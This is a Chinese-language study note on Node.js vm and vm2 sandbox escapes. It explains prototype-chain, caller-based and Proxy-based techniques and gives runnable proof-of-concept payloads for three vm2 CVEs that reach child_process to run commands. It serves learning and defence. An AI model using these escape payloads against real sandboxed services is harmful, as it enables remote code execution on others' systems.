---
title: "vm vm2 原理与逃逸"
date: 2026-03-06 15:16:16 +0800
categories: [WEB_Note]
tags: ["WEB", "node.js"]
web_folder: "node.js"
source_note: "node.js/vm vm2 原理与逃逸.md"
permalink: /web_note/nodejs/02/
render_with_liquid: false
---
# 1 前置知识

## 1.1 什么是沙箱（Sandbox）
其实这个概念在很多地方都能见到，之前接触地最多的是SSTI沙箱逃逸，这一篇讲vm库以及vm2库的沙箱，那就从0开始记录整理一下沙箱相关
### 1.1.1 沙箱的概念与作用

沙箱这个词来源于小孩玩耍的沙盒——在里面随便折腾，翻不出去。在计算机里，沙箱就是一个**受控的隔离运行环境**，让程序在里面跑，但限制它对外部系统的访问能力。

为什么需要沙箱？很多场景下我们需要运行"不完全受信任"的代码：

- 在线代码编辑器（用户提交的代码要在服务器上跑）
- 模板引擎（模板内容可能含有逻辑代码）
- 插件系统（第三方插件不应该能访问宿主系统）
- CTF 题目中常见的"让你执行代码但限制你能做的事"

沙箱的工作原理本质上是**重定向**——把代码要访问的资源、调用的函数，都重定向到沙箱内部受控的版本，真正危险的操作永远触达不了外部系统。

### 1.1.2 沙箱 / 虚拟机 / Docker 的区别

这三个概念经常混用，但有本质区别：

|概念|隔离级别|实现原理|典型用途|
|---|---|---|---|
|**沙箱**|进程级/语言级|代码层面拦截危险调用|限制脚本权限|
|**虚拟机**|操作系统级|模拟完整硬件环境|多系统并行运行|
|**Docker**|容器级|Linux namespace + cgroup|应用部署隔离|

简单理解：隔离强度 虚拟机 > Docker > 沙箱。沙箱最轻量，但也最容易被绕过。Docker 和沙箱嵌套使用是目前最常见的组合方案——外层 Docker 挡住大部分攻击，内层沙箱处理代码执行细节。

### 1.1.3 为什么说 vm 不是安全机制

Node.js 官方文档对 vm 模块有一句很直白的警告：

> The vm module is not a security mechanism. Do not use it to run untrusted code.

vm 模块的设计目标是**隔离代码的运行上下文**，比如避免变量污染、动态加载代码等，而不是防止恶意代码攻击。它没有做系统调用层面的拦截，只是在 JavaScript 层面做了一层上下文隔离，而 JavaScript 的原型链、调用栈等特性给了攻击者大量的逃逸路径。

---
## 1.2 Node.js 作用域体系

### 1.2.1 模块作用域与包隔离

在 Node.js 里，每一个 `.js` 文件都是一个独立的模块，有自己的作用域。模块之间天然隔离，变量不会互相污染——除非通过 `exports` 显式导出。
```javascript
// a.js
var secret = 'password123';

// b.js
require('./a');
console.log(secret); // 报错：secret is not defined
// 必须 a.js 里 exports.secret = secret 才能访问
```

### 1.2.2 全局对象 global 及其重要属性

Node.js 中对应浏览器 `window` 的全局对象叫 `global`。所有模块共享同一个 `global`，挂载在上面的属性可以在任何地方直接访问，不需要 `global.xxx` 前缀。

```javascript
// global 上的关键属性
global.process    // 进程对象
global.require    // 模块加载器
global.Buffer     // 二进制数据处理
global.console    // 控制台
global.setTimeout / setInterval / setImmediate
```

手动挂载到 global 的变量会变成全局变量：

```javascript
// a.js
global.myVar = 'hello';

// b.js
require('./a');
console.log(myVar); // 'hello' —— 可以直接访问，不需要 require
```

### 1.2.3 为什么 process 是 RCE 的终极目标

`process` 是 Node.js 中权限最大的内置对象，通过它可以：

```javascript
// 加载任意模块（包括系统级模块）
process.mainModule.require('child_process')

// 执行系统命令
process.mainModule.require('child_process').execSync('whoami')

// 读取环境变量（可能含密钥）
process.env

// 退出进程
process.exit(0)
```

因此，在 vm 沙箱逃逸中，**拿到 process 对象 = 获得 RCE**。沙箱会把 process 屏蔽掉，逃逸的目标就是绕过屏蔽拿到它。

---
## 1.3 在 Node.js 中执行字符串代码的三种方式

### 1.3.1 eval() —— 最简单但最危险

`eval()` 直接在**当前作用域**执行字符串，执行的代码能访问并修改当前作用域的所有变量。
```javascript
var age = 20;
eval('age = 999');
console.log(age); // 999 —— 当前作用域的变量被污染了

// 更危险的情况
eval('require("child_process").execSync("whoami").toString()');
// 直接可以 RCE，完全没有隔离
```

问题：

- 污染当前作用域
- 代码来自外部输入时，直接导致 RCE
- 性能差（每次都需要解析）

### 1.3.2 new Function() —— 独立函数作用域

`new Function(arg1, arg2, ..., body)` 动态创建一个函数。函数体运行在独立的函数作用域中，访问不到外部的局部变量（但能访问 global）。

```javascript
const secret = 'password';

const fn = new Function('x', 'return x * 2');
console.log(fn(5)); // 10

// 无法访问外部局部变量
const fn2 = new Function('return typeof secret');
console.log(fn2()); // 'undefined' —— 拿不到外面的 secret

// 但是可以访问 global！
const fn3 = new Function('return process.version');
console.log(fn3()); // v18.16.0 —— 直接访问了 global.process
```

`new Function` 比 `eval` 好一点，但还是不够安全——它能访问 `global`，意味着能访问 `process`，依然可以 RCE。

### 1.3.3 vm 模块 —— 为什么需要它

`eval` 和 `new Function` 的问题是无法控制执行环境——代码能访问什么、不能访问什么，开发者说了不算。

vm 模块允许你**自定义一个上下文（Context）**，代码只能在这个上下文里运行，访问不到宿主的 `global`，也访问不到 `process` 和 `require`——至少理论上是这样的。

```javascript
const vm = require('vm');

// 创建一个干净的沙箱上下文
const sandbox = { x: 1, y: 2 };
vm.createContext(sandbox);

// 代码在沙箱里运行，访问不到外面的东西
vm.runInContext('z = x + y', sandbox);
console.log(sandbox.z); // 3

// 在沙箱里访问 process 会失败
vm.runInContext('process.version', sandbox);
// 报错：process is not defined
```

这就是 vm 模块的价值：提供一个可控的独立上下文。但问题在于，这个"控制"并不彻底，接下来就是 vm 模块的安全缺陷。

---
## 1.4 JavaScript 原型链基础回顾
>理解 vm 逃逸必须先搞清楚原型链，这是整个逃逸技术的理论基础

### 1.4.1 什么是原型链

JavaScript 中每个对象都有一个隐藏属性 `__proto__`，指向它的原型对象。访问一个对象的属性时，如果对象本身没有，JavaScript 会沿着 `__proto__` 一路往上找，直到找到或者到达链的顶端（`null`）。

```javascript
const obj = { name: 'test' };

// obj 自身有 name 属性
console.log(obj.name); // 'test'

// obj 自身没有 toString，但原型链上有
console.log(obj.toString()); // '[object Object]'
// 实际上调用的是 Object.prototype.toString
```

原型链路径：`obj` → `Object.prototype` → `null`

### 1.4.2 constructor 属性的含义

每个对象的原型上都有一个 `constructor` 属性，指向创建这个对象的构造函数。

```javascript
const obj = {};
console.log(obj.constructor);             // Object（构造函数）
console.log(obj.constructor.constructor); // Function（Function 本身也是对象，它的构造器是 Function）

// 关键推导：
// 任何对象  ---.constructor--->  Object
// Object   ---.constructor--->  Function
// Function ---.constructor--->  Function（自身）

// 因此：
// 任意对象.constructor.constructor === Function
```

为什么这很重要？因为 `Function` 构造器可以动态创建并执行函数：

```javascript
// new Function('return process')() 等价于 (() => process)()
const fn = Function('return process');
const proc = fn(); // 拿到了 process 对象！
```

### 1.4.3 Object.create(null) 的特殊性

普通对象 `{}` 的原型链向上最终到达 `Object.prototype`，但 `Object.create(null)` 创建的对象**没有原型**。

```javascript
const normal = {};
console.log(normal.__proto__);              // Object.prototype
console.log(normal.constructor);            // Object
console.log(normal.constructor.constructor); // Function ← 逃逸路径

const nullProto = Object.create(null);
console.log(nullProto.__proto__);           // undefined
console.log(nullProto.constructor);         // undefined ← 路断了
```

这也是为什么 vm 沙箱防御会使用 `Object.create(null)` 来创建上下文——切断原型链，让 `constructor` 路径失效。但这只是第一道防线，后面还有别的绕过方式。

---
# 2 vm库
## 2.1 vm 模块详解

### 2.1.1 vm 模块是什么

`vm` 是 Node.js 内置模块，全称是 Virtual Machine（虚拟机），但这个"虚拟机"和 VMware 那种完全不是一回事。它的作用是：**在 V8 引擎内部开辟一个独立的 JavaScript 执行上下文，让代码在这个上下文里运行，与宿主环境的变量隔离。**

使用时直接 require，无需安装：
```javascript
const vm = require('vm');
```

### 2.1.2 核心 API 详解

#### 2.1.2.1 vm.runInThisContext(code)

在**当前 global** 下创建一个作用域并运行代码。能访问 `global` 上的全局变量，但访问不到当前文件里的局部变量。
```javascript
const vm = require('vm');

const localVar = 'I am local';
globalThis.globalVar = 'I am global';

vm.runInThisContext('console.log(typeof localVar)');  // 'undefined' —— 访问不到局部变量
vm.runInThisContext('console.log(globalVar)');        // 'I am global' —— 能访问 global
```

注意：`runInThisContext` 的隔离是不完整的，因为它共享宿主的 `global`，直接能访问 `process`。

#### 2.1.2.2 vm.createContext(sandbox)

将一个普通对象"上下文化"，让它变成一个独立沙箱的全局对象。这个操作是后续 `runInContext` 的前置步骤。
```javascript
const vm = require('vm');

const sandbox = { x: 10, name: 'test' };
vm.createContext(sandbox); // 上下文化，现在 sandbox 是一个沙箱环境

// 沙箱内代码的 "全局变量" 就是 sandbox 的属性
```

如果不传参数，会创建一个空的沙箱。

#### 2.1.2.3 vm.runInContext(code, contextifiedSandbox)

在已经上下文化的沙箱对象中运行代码。沙箱内的代码只能访问沙箱对象上的属性，访问不到宿主的 `global`。

```javascript
const vm = require('vm');

const sandbox = { x: 1, y: 2 };
vm.createContext(sandbox);

vm.runInContext('z = x + y', sandbox);
console.log(sandbox.z); // 3

// 沙箱内无法访问 process
try {
    vm.runInContext('process.version', sandbox);
} catch(e) {
    console.log(e.message); // process is not defined
}
```

#### 2.1.2.4 vm.runInNewContext(code, sandbox)

`createContext` + `runInContext` 的合体版，更简洁。会自动创建一个新的上下文并在其中运行代码。

```javascript
const vm = require('vm');

// 不需要手动 createContext，直接传沙箱对象
const result = vm.runInNewContext('x + y', { x: 3, y: 4 });
console.log(result); // 7

// 不传沙箱对象也行，会创建空沙箱
vm.runInNewContext('1 + 1'); // 2
```

#### 2.1.2.5 vm.Script 类

`vm.Script` 允许预编译一段代码，然后多次在不同的上下文中执行，避免重复解析的性能开销。

```javascript
const vm = require('vm');

// 编译一次
const script = new vm.Script('x * 2');

// 在多个上下文中复用
const ctx1 = vm.createContext({ x: 5 });
const ctx2 = vm.createContext({ x: 10 });

console.log(script.runInContext(ctx1)); // 10
console.log(script.runInContext(ctx2)); // 20
```

### 2.1.3 各 API 的隔离效果对比

|API|能访问 global|能访问局部变量|独立 context|安全性|
|---|---|---|---|---|
|`eval()`|✅|✅|❌|最低|
|`new Function()`|✅|❌|❌|低|
|`runInThisContext`|✅|❌|❌|低|
|`runInContext`|❌|❌|✅|中（有逃逸风险）|
|`runInNewContext`|❌|❌|✅|中（有逃逸风险）|

### 2.1.4 沙箱内的 this 指向什么

这一点很关键，直接影响逃逸的路径。

在 `runInNewContext` 或 `runInContext` 中，沙箱代码里的 `this` 默认指向传入的 **sandbox 对象**：

```javascript
const vm = require('vm');

const sandbox = { name: 'myBox' };
vm.createContext(sandbox);

const result = vm.runInContext('this', sandbox);
console.log(result === sandbox); // true —— this 就是 sandbox 本身
console.log(result.name);        // 'myBox'
```

关键点来了：这个 `sandbox` 对象是在**宿主环境**里创建的普通对象。它的原型链属于宿主。所以虽然代码在沙箱里跑，但通过 `this` 能摸到的 `constructor`，是宿主环境的 `Object` 和 `Function`——这就是原型链逃逸的入口。

---
## 2.2 vm 模块安全缺陷

### 2.2.1 缺陷一：runInThisContext 可直接访问 global

这个最直接，没什么技巧，`runInThisContext` 共享宿主 `global`，`process` 直接可用：
```javascript
const vm = require('vm');

// 直接 RCE，不需要任何逃逸技巧
const result = vm.runInThisContext(
    `process.mainModule.require('child_process').execSync('whoami').toString()`
);
console.log(result); // root
```

所以实际上有安全需求的代码绝对不会用 `runInThisContext`，都是用 `runInContext` 或 `runInNewContext` 配合自定义 sandbox。

### 2.2.2 缺陷二：传入对象仍保留宿主原型链

#### 2.2.2.1 为什么传入的 context 对象是"危险"的

当我们这样写：

```javascript
const sandbox = { user: 'guest' };
vm.createContext(sandbox);
```

`sandbox` 是在宿主环境里用字面量 `{}` 创建的，它的原型是宿主的 `Object.prototype`，原型上的 `constructor` 属性指向宿主的 `Object` 构造函数。`createContext` 只是把这个对象"标记"为沙箱的全局对象，并没有清洗它的原型链。

所以，沙箱里的代码通过 `this`（指向 sandbox）访问 `constructor`，拿到的是**宿主的 Object**，再访问 `constructor.constructor`，拿到的是**宿主的 Function**。

#### 2.2.2.2 原型链逃逸路径
```
this                              → sandbox（宿主创建的对象）
this.constructor                  → 宿主的 Object 构造函数
this.constructor.constructor      → 宿主的 Function 构造函数
this.constructor.constructor('return process')   → 创建一个返回 process 的函数
this.constructor.constructor('return process')() → 执行它，拿到宿主的 process！
```

整条路径的每一步都是利用 JavaScript 原型链的正常行为，没有任何黑魔法。

#### 2.2.2.3 完整逃逸 payload 演示

```javascript
const vm = require('vm');

const sandbox = { user: 'guest' };
vm.createContext(sandbox);

// payload：通过原型链爬出沙箱
const payload = `
    const hostProcess = this.constructor.constructor('return process')();
    hostProcess.mainModule.require('child_process').execSync('whoami').toString();
`;

const result = vm.runInContext(payload, sandbox);
console.log(result); // root

// 另一种等价写法（toString 也是宿主的方法）
const result2 = vm.runInNewContext(
    `this.toString.constructor('return process')()`
);
console.log(result2.mainModule.require('child_process').execSync('id').toString());
```

#### 2.2.2.4 为什么基本类型不能利用

如果 sandbox 里的值是数字、字符串、布尔这类基本类型，传入沙箱时是**值传递**，不是引用传递——沙箱里用的是一份拷贝，跟宿主环境里的那个对象已经没有关系了，原型链路径自然也就断了。

```javascript
const vm = require('vm');

// 无法利用：数字是基本类型
const ctx1 = { n: 42 };
// ctx1.n 在沙箱内是基本类型，n.constructor 是沙箱内部的 Number，不是宿主的

// 可以利用：数组/对象是引用类型，传的是引用
const ctx2 = { arr: [] };
vm.runInNewContext(
    'arr.constructor.constructor("return process")()',
    ctx2
).mainModule.require('child_process').execSync('whoami');
```

### 2.2.3 防御尝试：Object.create(null)

#### 2.2.3.1 原理：切断原型链

意识到问题后，一个常见的修复思路是：既然原型链是问题根源，那就创建一个没有原型链的 sandbox：

```javascript
const sandbox = Object.create(null);
// sandbox.__proto__ === undefined
// sandbox.constructor === undefined
```

#### 2.2.3.2 为什么能防住 constructor 攻击

```javascript
const vm = require('vm');

const sandbox = Object.create(null);
const context = vm.createContext(sandbox);

// 这条路走不通了：
// this.constructor → undefined
// this.constructor.constructor → 报错：Cannot read property 'constructor' of undefined
try {
    vm.runInContext('this.constructor.constructor("return process")()', context);
} catch(e) {
    console.log(e.message); // Cannot read properties of undefined (reading 'constructor')
}
```

原型链被切断，`constructor` 路径失效。

#### 2.2.3.3 但还不够——新的攻击面

切断原型链只堵住了一种路径，但 JavaScript 里还有别的手段可以在沙箱内外建立联系。`Object.create(null)` 只是把 `constructor` 这条路封死了，攻击者转而利用 JavaScript 的**函数调用机制**，也就是下一节的 `arguments.callee.caller`。

---

## 2.3 vm 模块进阶逃逸

### 2.3.1 arguments.callee.caller 是什么

#### 2.3.1.1 arguments 对象介绍

在 JavaScript 普通函数（非箭头函数）内部，有一个自动存在的 `arguments` 对象，包含了调用该函数时传入的所有参数。

```javascript
function test(a, b, c) {
    console.log(arguments);       // Arguments [1, 2, 3]
    console.log(arguments[0]);    // 1
    console.log(arguments.length); // 3
}
test(1, 2, 3);
```

`arguments` 不是真正的数组，是一个类数组对象（Array-like），除了参数列表外还有两个特殊属性：`callee` 和 `caller`（在严格模式 `'use strict'` 下这两个属性被禁用）。

#### 2.3.1.2 callee 与 caller 的含义

```javascript
function inner() {
    // arguments.callee  → 当前正在执行的函数本身（即 inner）
    // arguments.callee.caller → 调用了 inner 的那个函数
    console.log(arguments.callee === inner);         // true
    console.log(arguments.callee.caller === outer);  // true
}

function outer() {
    inner();
}

outer();
```

- `arguments.callee`：当前函数本身的引用，常用于匿名函数内部的自递归
- `arguments.callee.caller`：**调用了当前函数的那个函数**，是逃逸的关键

#### 2.3.1.3 利用思路：让宿主来调用我们

核心思路就一句话：**如果沙箱里的函数被宿主环境调用，那么这个函数的 `arguments.callee.caller` 就指向宿主环境里的某个函数。**

拿到了宿主环境的函数，它的 `constructor.constructor` 就是宿主的 `Function`，之后就是熟悉的原型链路径了。

问题变成了：怎么让宿主"主动"来调用沙箱里的函数？

有三种思路，按侵入程度从低到高：

- **等宿主触发字符串操作**（toString）
- **等宿主访问属性**（Proxy get 钩子）
- **主动抛出异常逼宿主处理**（throw Proxy）

### 2.3.2 技巧 A：重写 toString —— 等宿主上钩

#### 2.3.2.1 触发条件：字符串拼接

当 JavaScript 把一个对象和字符串拼接时（`'Hello ' + obj`），会自动调用对象的 `toString()` 方法。如果宿主代码里有类似 `console.log('结果：' + res)` 或者 `'prefix' + vm.run(...)` 这样的写法，我们就能利用这个时机。

#### 2.3.2.2 完整代码演示

```javascript
const vm = require('vm');

const payload = `(() => {
    const a = {};
    a.toString = function() {
        // 这个函数是在沙箱里定义的，但被宿主调用
        // 所以 caller 是宿主环境里的函数
        const cc = arguments.callee.caller;
        const p = cc.constructor.constructor('return process')();
        return p.mainModule.require('child_process').execSync('whoami').toString();
    };
    return a; // 把这个"陷阱对象"返回给宿主
})()`;

const sandbox = Object.create(null);
const res = vm.runInContext(payload, vm.createContext(sandbox));

// 宿主在这里做了字符串拼接，触发了 toString
console.log('执行结果：' + res); // 打印出 whoami 的结果
```

**执行流程梳理**：

1. 沙箱代码运行，创建对象 `a`，重写 `a.toString`，返回 `a` 给宿主
2. 宿主执行 `'执行结果：' + res`，触发 `res.toString()`
3. `toString` 在宿主环境的上下文中被调用，`arguments.callee.caller` 指向了宿主的某个函数
4. 拿到宿主函数引用，沿原型链获取 `Function`，创建返回 `process` 的函数并执行
5. 拿到 `process`，RCE

### 2.3.3 技巧 B：Proxy 拦截任意属性访问

#### 2.3.3.1 ES6 Proxy 简介

ES6 的 `Proxy` 可以对一个对象的各种操作设置拦截器（trap）。最常用的是 `get` 拦截器——只要有人访问对象的任意属性，就会触发。

```javascript
const p = new Proxy({}, {
    get(target, key) {
        console.log(`有人访问了属性：${key}`);
        return target[key];
    }
});

p.name;   // 打印：有人访问了属性：name
p.abc;    // 打印：有人访问了属性：abc（即使属性不存在也触发）
```

#### 2.3.3.2 get 钩子的触发条件

**任意属性访问都会触发**，包括访问不存在的属性。这比 `toString` 的触发条件宽松太多——只要宿主代码里有 `res.anything`，就会触发。

#### 2.3.3.3 完整代码演示

```javascript
const vm = require('vm');

const payload = `(() => {
    const trap = new Proxy({}, {
        get: function() {
            const cc = arguments.callee.caller;
            const p = cc.constructor.constructor('return process')();
            return p.mainModule.require('child_process').execSync('whoami').toString();
        }
    });
    return trap;
})()`;

const sandbox = Object.create(null);
const res = vm.runInContext(payload, vm.createContext(sandbox));

// 宿主访问了 res 的某个属性，触发 get 钩子
console.log(res.abc);   // 触发逃逸，打印 whoami 结果
console.log(res[0]);    // 访问任意属性都行
```

比 `toString` 更好用的地方：不需要宿主做字符串拼接，只要宿主读取返回值的任何属性就行，触发场景更多。

### 2.3.4 技巧 C：throw Proxy —— 主动出击

#### 2.3.4.1 为什么前两种需要宿主配合

- 技巧 A 需要宿主做字符串拼接
- 技巧 B 需要宿主访问返回对象的属性

如果宿主代码很简单，只是：

```javascript
try {
    const res = vm.run(userCode);
    // 什么都没做，或者只是简单判断类型
} catch(e) {
    console.log('Error: ' + e); // 注意这里有字符串拼接！
}
```

这种情况下，前两种技巧都不一定能触发，但 `throw` 配合 Proxy 可以强制让宿主处理一个恶意对象。

#### 2.3.4.2 异常抛出触发机制

沙箱内直接 `throw` 一个 Proxy 对象。宿主 `catch` 到异常后，如果有任何对这个异常对象的操作（比如打印 `'Error: ' + e` 触发 `toString`，或者 `console.log(e)` 触发内部属性访问），就会触发 Proxy 的 get 钩子，完成逃逸。

#### 2.3.4.3 完整代码演示

```javascript
const vm = require('vm');

const payload = `
    throw new Proxy({}, {
        get: function() {
            const cc = arguments.callee.caller;
            const p = cc.constructor.constructor('return process')();
            return p.mainModule.require('child_process').execSync('whoami').toString();
        }
    });
`;

try {
    vm.runInContext(payload, vm.createContext(Object.create(null)));
} catch(e) {
    // 宿主在这里访问了 e 的属性（字符串拼接触发 toString/Symbol.toPrimitive 等）
    console.log('Error: ' + e); // 逃逸触发，打印 whoami 结果
}
```

**三种技巧对比总结**：

|技巧|触发条件|需要宿主配合|适用场景|
|---|---|---|---|
|重写 toString|字符串拼接|需要|宿主有 `'str' + res` 写法|
|Proxy get|访问任意属性|需要|宿主有 `res.xxx` 写法|
|throw Proxy|打印/处理异常|基本不需要|通用，最推荐|

---
# 3 vm2库
## 3.1 vm2 模块详解

### 3.1.1 vm2 是什么，为什么出现

原生 vm 的逃逸路径太多，不适合用于生产环境中执行不可信代码。`vm2` 是社区开发的第三方沙箱库，在 vm 的基础上做了大量安全加固，曾是 Node.js 生态里最广泛使用的沙箱方案。

安装使用：
```bash
npm install vm2
```

```javascript
const { VM } = require('vm2');
const result = new VM().run('1 + 1');
console.log(result); // 2
```

### 3.1.2 vm2 的三大防御升级

#### 3.1.2.1 ES6 Proxy 代理之墙

原生 vm 里，沙箱代码直接操作宿主传进来的对象，可以通过 `constructor` 属性爬出原型链。vm2 的解决思路是：**任何跨越沙箱边界的对象，都强制套上 Proxy 代理**。
```
// 原生 vm：
沙箱代码 → this.constructor → 直接拿到宿主 Object → RCE

// vm2：
沙箱代码 → this.constructor → 触发 Proxy get 拦截器
                             → vm2 检测到危险属性访问
                             → 返回沙箱内安全的替代品
                             → 逃逸失败
```

vm2 在内部为所有进出沙箱的对象创建对应的 Proxy，拦截对 `constructor`、`__proto__` 等危险属性的访问。

#### 3.1.2.2 Contextify / Decontextify 双向海关机制

光有 Proxy 还不够，还需要处理对象在沙箱和宿主之间流动的问题。vm2 实现了两个转换机制：

- **Contextify（沙箱化）**：宿主对象进入沙箱时的处理。过滤敏感属性，包上 Proxy，变成"安全副本"。比如宿主的 `Buffer` 对象进入沙箱后，变成一个经过阉割的版本，危险操作被屏蔽。

- **Decontextify（去沙箱化）**：沙箱对象返回宿主时的处理。防止沙箱代码在返回值里埋地雷（比如我们在上一节演示的，返回一个重写了 `toString` 的恶意对象）。经过 Decontextify 处理后，返回值是一个安全的版本。

这个机制相当于在沙箱边界设了双向海关，进出都要检查。

#### 3.1.2.3 重写危险内置 API（sandbox.js）

vm2 在 `sandbox.js` 中对 Node.js 内置的危险对象进行了全面替换：
```
真实的 Buffer     → 阉割版 Buffer（过滤危险操作）
真实的 setTimeout → 代理版 setTimeout（防止定时器逃逸）
真实的 process    → 完全屏蔽（VM 模式下不提供）
真实的 require    → 完全屏蔽（VM 模式下不提供）
```

沙箱里用到的内置对象都不是真实的，都是经过处理的安全版本。

### 3.1.3 vm2 的包结构

了解 vm2 的文件结构有助于在分析漏洞时快速定位关键代码：
```
vm2/
  ├── cli.js          ← 命令行调用入口（vm2 命令）
  ├── main.js         ← 对外导出 VM、NodeVM、VMScript 类
  ├── contextify.js   ← 核心文件：实现 Contextify 和 Decontextify
  └── sandbox.js      ← 对 global 内置对象的 hook 和替换
```

其中 `contextify.js` 是最核心的文件，几乎所有的漏洞都跟它有关——攻击者需要找到 vm2 在哪个地方漏掉了代理，让宿主对象裸露出来。

### 3.1.4 vm2 的两种使用模式

#### 3.1.4.1 VM 模式（严格沙箱）

完全屏蔽 `require` 和 `process`，只能运行纯粹的 JavaScript 计算逻辑：

```javascript
const { VM } = require('vm2');

const vm = new VM({
    timeout: 1000,      // 超时限制，防止死循环
    allowAsync: false,  // 禁止异步代码（部分版本支持）
});

console.log(vm.run('1 + 1'));        // 2
console.log(vm.run('process'));       // 报错：process is not defined
console.log(vm.run('require("fs")')); // 报错：require is not defined
```

#### 3.1.4.2NodeVM 模式（宽松沙箱）

允许使用受限的 `require`，可以配置允许加载哪些模块：

```javascript
const { NodeVM } = require('vm2');

const nvm = new NodeVM({
    require: {
        external: ['lodash'],      // 只允许加载 lodash
        root: './',                 // 限制模块加载的根目录
    }
});

// 允许的操作
nvm.run(`
    const _ = require('lodash');
    module.exports = _.chunk([1,2,3,4], 2);
`);

// 不允许的操作
nvm.run(`require('child_process')`); // 报错
```

### 3.1.5 vm2 的基本使用方式

```javascript
const { VM, NodeVM, VMScript } = require('vm2');

// 方式一：直接 run 字符串
const result = new VM().run('Math.pow(2, 10)');
console.log(result); // 1024

// 方式二：预编译 VMScript 后执行（性能更好）
const script = new VMScript('Math.pow(base, exp)');
const vm = new VM();
vm.setGlobal('base', 2);
vm.setGlobal('exp', 8);
console.log(vm.run(script)); // 256

// 方式三：向沙箱传入安全数据
const vm2 = new VM({
    sandbox: { name: 'test', data: [1, 2, 3] }
});
console.log(vm2.run('name + " - " + data.length')); // 'test - 3'
```

---
## 3.2 vm2 历史 CVE 复现

### 3.2.1 CVE-2019-10761：调用栈溢出逃逸（≤ 3.6.10）

**安装**：`npm install vm2@3.6.10`

#### 3.2.1.1 漏洞原理：V8 调用栈上限

V8 引擎对函数调用栈的深度有上限（大约 10000 层左右，具体取决于 Node.js 版本）。如果调用深度超过这个上限，V8 会抛出一个 `RangeError: Maximum call stack size exceeded`。

这个 Error 是 V8 引擎在**宿主环境**中创建的，不属于沙箱内部。如果我们能在沙箱里 `catch` 到这个来自宿主的 Error 对象，它的 `constructor` 自然就是宿主的 `Error` 构造函数，再往上一步就是宿主的 `Function`。

#### 3.2.1.2 触发流程分析
```
1. 沙箱内疯狂递归函数 r(i)，使调用栈接近极限
2. 在调用栈快满时，调用宿主函数 Buffer.prototype.write（这是宿主环境的函数）
3. Buffer.prototype.write 试图入栈，触发了爆栈
4. V8 在宿主环境中创建 RangeError 对象并抛出
5. 沙箱代码 catch 到这个异常对象 e
6. e 是宿主的 Error 对象 → e.constructor 是宿主 Error → e.constructor.constructor 是宿主 Function
7. 后续正常流程：用 Function 获取 process，RCE
```

关键点：不是沙箱内的递归直接爆了，而是精心控制，**恰好在宿主函数入栈时触发爆栈**，这样爆出来的异常是宿主的。

#### 3.2.1.3 完整 POC

```javascript
"use strict";
const { VM } = require('vm2');

const payload = `
const f = Buffer.prototype.write;   // 目标：宿主函数
const ft = {
    length: 10,
    utf8Write() {}
};

function r(i) {
    var x = 0;
    try {
        x = r(i);           // 递归调用自身，使调用栈逼近极限
    } catch(e) {}

    if (typeof(x) !== 'number') return x;  // 如果已经拿到宿主对象，直接往上传
    if (x !== i) return x + 1;             // 调用栈还没到指定深度，继续累加
    try {
        f.call(ft);         // 到达指定深度，调用宿主函数，触发宿主 RangeError
    } catch(e) {
        return e;           // 拿到宿主 Error 对象，开始往外传
    }
    return null;
}

var i = 1;
while(1) {
    try {
        // 尝试用拿到的 Error 对象爬出 Function，获取 process
        i = r(i).constructor.constructor("return process")();
        break;
    } catch(x) {
        i++;    // 失败就调整深度，继续尝试
    }
}
i.mainModule.require("child_process").execSync("whoami").toString();
`;

try {
    console.log(new VM().run(payload));
} catch(x) {
    console.log(x);
}
```
---
### 3.2.2 CVE-2021-23449：动态 import() 语法逃逸（≤ 3.9.4）

**安装**：`npm install vm2@3.9.3`

#### 3.2.2.1 漏洞原理：import() 是语法而非函数

`import()` 是 ES2020 引入的动态导入语法，它在语法层面是一个关键字，而不是一个普通的 JavaScript 函数。这个区别非常关键。

```javascript
// require 是一个普通函数，可以被代理、重写、拦截
require('fs')

// import() 是语言语法，像 typeof、instanceof 一样，不是函数
// 无法通过修改变量名或代理来拦截它
import('./module.js')
```

#### 3.2.2.2 为什么 vm2 无法代理它

vm2 拦截 `require` 的方式是：在沙箱上下文中用代理版的 `require` 覆盖真实的 `require`。但 `import()` 是语法结构，V8 在底层直接处理它，不会走任何 JavaScript 层面的变量查找，所以 vm2 根本没有机会拦截。

`import()` 返回一个 `Promise` 对象，这个 Promise 直接来自宿主环境，没有经过 vm2 的 Contextify 处理，是一个"裸露"的宿主对象，可以直接通过它的 `toString.constructor` 路径获取宿主 Function。

#### 3.2.2.3 完整 POC

```javascript
const { VM } = require('vm2');

const payload = `
    // import('./foo.js') 返回的是宿主 Promise，foo.js 不需要存在
    // 即使文件不存在导致 Promise rejected，对象本身已经泄漏出来了
    let res = import('./foo.js');

    // res 是宿主 Promise，其 toString 是宿主方法，constructor 链条完整
    res.toString.constructor("return process")()\
        .mainModule.require("child_process")\
        .execSync("whoami").toString();
`;

new VM().run(payload);
```

**修复方式**：vm2 的修复方案相当粗糙——用正则表达式匹配并替换代码中所有的 `import` 关键字。遇到动态 import 就直接抛出 `Dynamic Import not supported` 错误，相当于直接禁用这个语法特性。

---
### 3.2.3 CVE-2022-36067：Error.prepareStackTrace 覆盖（≤ 3.9.10）

**安装**：`npm install vm2@3.9.10`（建议在 Linux/macOS 上测试，Windows 可能有差异）

#### 3.2.3.1 漏洞原理：V8 底层堆栈格式化回调

Node.js 允许通过 `Error.prepareStackTrace` 自定义 Error 对象的 `.stack` 属性的格式化方式。这是 V8 暴露的一个底层钩子：

```javascript
Error.prepareStackTrace = function(err, structuredStackTrace) {
    // structuredStackTrace 是一个 CallSite 对象数组
    // 每个 CallSite 包含调用栈帧的信息
    // 关键：CallSite.getThis() 可以返回该栈帧的 this 对象！
    return structuredStackTrace;
};

const err = new Error();
const frames = err.stack; // 触发 prepareStackTrace 回调
```

#### 3.2.3.2 frames 数组泄露了什么

`structuredStackTrace`（即 frames 数组）里的每个 `CallSite` 对象有一个 `getThis()` 方法，返回该调用栈帧对应函数的 `this` 值。由于调用栈横跨了沙箱内外，其中必然有宿主环境的栈帧，`getThis()` 就能返回宿主环境的对象。

vm2 修复了直接覆盖 `Error.prepareStackTrace` 的问题（3.9.10 之前通过本地 WeakMap 保护了自己的 localError），但没有处理通过 `globalThis.Error` 重定义的情况。

#### 3.2.3.3 完整 POC

```javascript
const { VM } = require('vm2');

const payload = `
    // 保留原始 Error，用于创建新的 Error 实例
    globalThis.OldError = globalThis.Error;

    // 重新定义 Error，绕过 vm2 对原始 Error 的保护
    globalThis.Error = {};
    globalThis.Error.prepareStackTrace = (errStr, traces) => {
        // traces 是调用栈帧数组
        // traces[0].getThis() 返回最顶层栈帧的 this，是宿主环境对象
        traces[0].getThis().process
            .mainModule.require('child_process')
            .execSync('whoami');
    };

    // 触发堆栈格式化
    const { stack } = new globalThis.OldError;
`;

new VM().run(payload);
```
---
